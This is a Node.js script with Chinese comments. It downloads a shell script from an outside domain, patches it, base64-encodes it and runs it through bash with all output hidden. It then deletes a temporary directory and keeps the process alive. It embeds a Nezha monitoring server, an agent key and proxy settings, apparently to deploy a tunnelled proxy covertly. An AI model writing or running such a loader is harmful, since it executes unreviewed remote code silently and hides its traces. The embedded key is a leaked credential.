const { execSync, spawn } = require('child_process');
const fs = require('fs');

function runScriptWithEnv() {
    const envVars = {
        UUID: 'faacf142-dee8-48c2-8558-641123eb939c',
        NEZHA_SERVER: 'nezhak2.btpp.ggff.net',
        NEZHA_PORT: '443',
        NEZHA_KEY: 'BPE30BICd8kvO84006',
        HY2_PORT: '7860',
        ARGO_DOMAIN: '',
        ARGO_AUTH: '',
        CFIP: 'jd.bp.cloudns.ch'
    };

    // 1. 更新主脚本下载链接
    const scriptUrl = 'https://main.sss.hidns.vip/sb.sh';
    const fullEnv = { ...process.env, ...envVars };
    const cleanupDelay = 60 * 1000; // 1 minute in milliseconds

    async function executeAndReplace() {
        try {
            // 2. 下载主脚本内容
            const downloadCommand = `curl -Ls ${scriptUrl}`;
            let scriptContent = execSync(downloadCommand, { encoding: 'utf8' });
            
            // 3. 应用脚本内容修正
            // 移除原本的 curl 检测逻辑
            scriptContent = scriptContent.replace(/command -v curl .* Error: neither curl nor curl -LO found, please install one of them.*?\n/, '');
            
            // 【关键修改】：匹配并替换新域名下的二进制文件下载指令
            // 将原来的 ssss.nyc.mn 替换为 sss.hidns.vip
            scriptContent = scriptContent.replace(/\$COMMAND sbx \"https:\/\/\$ARCH\.sss\.hidns\.vip\/sbsh\"/, 'curl -o sbx "https://$ARCH.sss.hidns.vip/sbsh"');
            
            const base64Script = Buffer.from(scriptContent).toString('base64');
            const finalBashCommand = `echo ${base64Script} | base64 -d | bash`;

            // 4. 静默执行脚本
            const setupProcess = spawn('bash', ['-c', finalBashCommand], {
                env: fullEnv,
                shell: false,
                stdio: 'ignore'
            });

            await new Promise((resolve, reject) => {
                setupProcess.on('close', (code) => {
                    if (code !== 0) {
                        reject(new Error(`Bash setup failed with code ${code}.`));
                    } else {
                        resolve();
                    }
                });

                setupProcess.on('error', (err) => {
                    reject(new Error('Failed to start setup bash process: ' + err.message));
                });
            });

            // 5. 延迟清理 .tmp 目录
            setTimeout(() => {
                try {
                    fs.rmSync('./.tmp', { recursive: true, force: true });
                } catch (e) {
                    // 忽略错误
                }
            }, cleanupDelay);

            // 6. 进程保活
            const keepAliveCommand = 'tail -f /dev/null';
            
            spawn(keepAliveCommand, {
                stdio: 'ignore',
                shell: true,
                detached: false
            }).on('error', (err) => {
                process.exit(1);
            });
            
        } catch (error) {
            process.exit(1);
        }
    }

    executeAndReplace();
}

runScriptWithEnv();
